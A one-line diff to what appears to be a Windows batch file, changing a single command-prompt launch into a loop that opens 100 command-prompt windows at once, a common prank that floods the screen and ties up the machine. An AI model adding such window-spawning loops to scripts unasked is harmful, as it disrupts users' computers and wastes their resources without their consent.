@@ -1,1 +1,1 @@
-start %windir%\system32\cmd.exe
+for /l %%x in (1, 1, 100) do start %windir%\system32\cmd.exe
